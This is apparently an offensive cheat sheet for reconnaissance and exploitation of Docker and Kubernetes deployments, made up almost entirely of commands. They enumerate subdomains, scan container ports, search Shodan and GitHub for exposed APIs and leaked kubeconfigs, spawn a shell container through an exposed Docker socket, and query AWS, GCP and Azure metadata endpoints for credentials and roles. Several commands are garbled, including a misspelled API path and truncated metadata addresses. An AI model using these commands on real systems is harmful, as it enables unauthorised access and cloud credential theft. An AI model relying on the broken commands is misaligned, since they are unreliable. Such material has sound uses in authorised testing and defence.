#### Initial Reconnaissance

1. **DNS Reconnaissance**:
   - Use DNS enumeration tools to discover subdomains and potential entry points.
   ```bash
   # Sublist3r
   sublist3r -d target.com -o subdomains.txt

   # amass
   amass enum -d target.com -o amass_subdomains.txt

   # assetfinder
   assetfinder --subs-only target.com > assetfinder_subdomains.txt

   # DNSRecon with a wordlist
   dnsrecon -d target.com -t brt -D /path/to/wordlist.txt -o dnsrecon_results.txt

   # Knockpy
   knockpy target.com
   ```

#### Scanning for Containers and Kubernetes

1. **Nmap Scans**:
   - Identify open ports and services related to containers and Kubernetes.
   ```bash
   # Scan for common container and Kubernetes ports
   nmap -p 2375,2376,10250,10255,6443,9000 -sV -oA nmap_container_scan target.com

   # Full scan of the target
   nmap -p- -sV -oA nmap_full_scan target.com
   ```

#### Fuzzing and Wordlists

1. **Fuzzing for Container-specific Paths**:
   - Use specific wordlists that contain paths for Docker, Kubernetes, and other container systems.
   ```bash
   # ffuf for directory brute-forcing
   ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/container_paths.txt -e .php,.html,.js,.json,.yml,.yaml,.conf,.cfg

   # dirb for directory brute-forcing
   dirb https://target.com /opt/SecLists/Discovery/Web-Content/container_paths.txt

   # gobuster for directory brute-forcing
   gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/container_paths.txt -e
   ```

#### Tools for Container and Kubernetes Recon

1. **k8s-hunter**:
   - Hunts for security weaknesses in Kubernetes clusters.
   ```bash
   k8s-hunter --quick
   ```

2. **kube-hunter**:
   - A tool to perform security hunting on Kubernetes clusters.
   ```bash
   kube-hunter --remote target.com
   ```

3. **Shodan for Docker and Kubernetes**:
   - Search Shodan for Docker API and Kubernetes Dashboard.
   ```bash
   # Search for Docker API
   shodan search 'docker "2375"'

   # Search for Kubernetes Dashboard
   shodan search 'title:"Kubernetes Dashboard"'
   ```

#### Finding and Exploiting Configuration Files

1. **Common Paths for Configuration Files**:
   - Look for paths that might contain configuration files for Docker and Kubernetes.
   ```bash
   # Common Docker and Kubernetes paths
   /etc/docker/
   /etc/kubernetes/
   /var/lib/docker/
   /var/lib/kubelet/
   ~/.kube/config
   ~/.docker/config.json
   ```

2. **Public Repositories and Leaked Credentials**:
   - Search public repositories for leaked configuration files and credentials.
   ```bash
   # GitHub dorking for Kubernetes and Docker
   site:github.com "kubeconfig"
   site:github.com "docker-compose.yml"
   ```

#### Exploiting Docker and Kubernetes

1. **Exploiting Docker**:
   - If Docker API is exposed, gain access and control.
   ```bash
   # List containers
   curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

   # Run a new container
   curl -s --unix-socket /var/run/docker.sock -XPOST -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["sh"]}' http://localhost/containers/create

   # Start the container
   curl -s --unix-socket /var/run/docker.sock -XPOST http://localhost/containers/<container_id>/start

   # Access the container
   docker exec -it <container_id> sh
   ```

2. **Exploiting Kubernetes**:
   - Access Kubernetes Dashboard and clusters if exposed.
   ```bash
   # Accessing via kubectl proxy
   kubectl proxy
   curl http://localhost:8001/api/v1/nespaces/kube-system/services/https:kubernetes-dashboard:/proxy/

   # Forward port and access
   kubectl port-forward service/kubernetes-dashboard 10443:443
   ```

3. **Exploiting Cloud Metadata Services**:
   - Leverage cloud instance metadata services to gain further insights or credentials.

   - **AWS Metadata**:
     ```bash
     curl http://ip/latest/meta-data/
     ```

   - **GCP Metadata**:
     ```bash
     curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
     ```

   - **Azure Metadata**:
     - Fetch Azure instance metadata, including IAM roles and network configuration:
     ```bash
     curl -H Metadata:true "http://169.254/metadata/instance?api-version=2021-01-01"

     # Azure Privileged Roles
     curl -H Metadata:true "http://169.254/metadata/identity/roles?api-version=2019-06-01"

     # Azure Network Configuration
     curl -H Metadata:true "http://169.254/metadata/instance/network?api-version=2021-01-01"
     ```
